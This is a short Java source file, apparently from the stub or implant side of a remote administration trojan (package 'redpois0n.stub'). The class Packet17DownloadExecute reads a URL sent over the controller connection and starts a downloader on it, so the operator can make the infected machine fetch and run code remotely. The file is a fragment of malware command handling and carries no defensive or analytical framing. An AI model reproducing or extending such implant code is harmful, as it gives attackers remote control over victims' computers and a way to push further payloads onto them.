package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();	
		new Downloader(url, false).start();
	}

}